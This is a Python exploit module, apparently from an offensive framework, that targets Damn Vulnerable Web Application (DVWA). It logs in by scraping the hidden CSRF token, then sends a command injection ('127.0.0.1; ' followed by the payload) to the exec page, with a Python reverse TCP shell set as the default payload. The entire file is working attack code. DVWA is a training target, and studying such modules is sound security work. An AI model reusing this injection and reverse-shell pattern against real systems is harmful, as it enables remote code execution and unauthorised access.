from deathnote_module import *
from lib.http.http_client import Http_client
from lib.http.http_login import Http_login
from bs4 import BeautifulSoup

class Module(Exploit, Http_client, Http_login):


	__info__ = {
			"name": "Damn Vulnerable Web Application rce",
			"description": "Damn Vulnerable Web Application rce",
			"cve": "",
			"payload": {
				"default": "payloads/singles/cmd/unix/python_reverse_tcp",
				"platform": "all",
				"arch":"cmd",
				"category": "singles",
				}			
		}

	def get_token(self,source):
		soup = BeautifulSoup(source, "html.parser")
		return soup.find('input', { "type" : "hidden" })['value']

	def run(self):
		#################
		# Login to dvwa #
		#################
		login = self.http_request(
				method="GET",
				path="/dvwa/login.php",
				session=True
				)
				
		headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:60.0)Gecko/20100101 Firefox/60.0', 'Upgrade-Insecure-Requests': '1'}
		data = {
				"username"   : self.username,
				"password"   : self.password,
				"Login"      : "Submit",
				"user_token" : self.get_token(login.text)
				}
		r = self.http_request(
				method="POST",
				path="/dvwa/login.php",
				data=data,
				headers=headers,
				session=True
			)
		if 'Login failed' in r.text:
			self.login_failed()
			return
		else:
			self.login_success()
			##############
			# GO to exec #
			##############
			payload = {'ip': f'127.0.0.1; {self.payload}','Submit':'Submit','user_token':self.get_token(login.text)}
			pwn = self.http_request(
					method="POST",
					path="/dvwa/vulnerabilities/exec/#",
					data=payload,
					session=True
					)
